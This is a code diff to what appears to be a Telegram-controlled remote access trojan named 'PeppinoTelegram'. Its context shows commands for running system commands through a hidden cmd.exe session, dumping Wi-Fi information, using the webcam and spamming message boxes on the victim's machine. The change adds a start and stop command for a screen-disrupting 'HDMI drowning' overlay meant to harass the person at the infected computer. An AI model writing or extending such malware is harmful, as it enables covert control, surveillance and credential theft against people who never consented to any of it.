@@ -306,7 +306,8 @@ messagebox - Show a custom message box.
 messagespam - Spam message boxes.
 camerawallpaper - Sets webcam's frames as wallpaper.
 setvideowallpaper - Sets a video as wallpaper.
-hdmi_drowning_effect - Sets an noise/disturbed effect overlay on screen.
+hdmi_drowning_effect - Sets a noise/disturbed effect overlay on screen.
+stop_hdmi_drowning_effect - Stops the noise/disturbed effect overlay on screen.
 
 💻 System Control
 execute - Run system command.
@@ -873,7 +874,7 @@ class PeppinoTelegram:
         self.wifidumper = WifiDumper()
         self.all_session_messages: list[int] = []
 
-        self.overlays: list[OverlayPlayer] = set()
+        self.hdmiDrownerOverlayPlayer: HDMIDrownedOverlay = HDMIDrownedOverlay()
 
         self.cmd_session = CMDSession("cmd.exe /K cd /d %USERPROFILE%'")
         self.cmd_session_active: bool = False
@@ -973,6 +974,8 @@ class PeppinoTelegram:
             "menu_plugins":self.menu_plugins,
             "leftclick":self.leftclick,
             "rightclick":self.rightclick,
+            "hdmi_drowning_effect":self.wrapper_for_hdmi_overlay,
+            "stop_hdmi_drowning_effect":self.hdmiDrownerOverlayPlayer.stop,
             "nothing":lambda:...,
             "getvolume":lambda:self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
             "tralalerotralala":lambda:self.__play_loaded_sound("tralarero-tralala", volume=8),
@@ -1202,6 +1205,10 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             except:
                 pass#ignore file errors
         destroyAllWindows()
+        try:
+            self.hdmiDrownerOverlayPlayer.stop()
+        except:
+            ...
         self.audio_mixer.mute()
         #self.restore_wallpaper()
         self.cantopenlist.clear()
@@ -1598,6 +1605,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             "📷 Camera wallpaper": "/camerawallpaper",
             "🎞️ Set video wallpaper": "/setvideowallpaper",
             "🖥️🌀 Hdmi Drowning Effect":"hdmi_drowning_effect",
+            "🖥️❌ Stop Hdmi Drowning Effect":"stop_hdmi_drowning_effect",
         }
 
         if self.mainmenu_ref:
@@ -2559,6 +2567,16 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def wifiinfo(self) -> None:
         self.bsend(f"🌐 *Wifi-Info*\n\n{str(self.wifidumper)}", parse_mode="markdown")
+
+    def _wrapper_for_hdmi_overlay(self, timeout_seconds: int, player: HDMIDrownedOverlay) -> None:
+        loading_bar = self.new_loading_bar(timeout_seconds, label="️🌀 Hdmi Drowning Effect")
+        start = time()
+        Thread(target=player.run, args=(timeout_seconds, )).start()
+        while (time()-start) < timeout_seconds:
+            loading_bar.update(time()-start)
+
+    def wrapper_for_hdmi_overlay(self, timeout_seconds: int) -> None:
+        Thread(target=self._wrapper_for_hdmi_overlay, args=(timeout_seconds,self.hdmiDrownerOverlayPlayer)).start()
 
 """
 ooo        ooooo            o8o
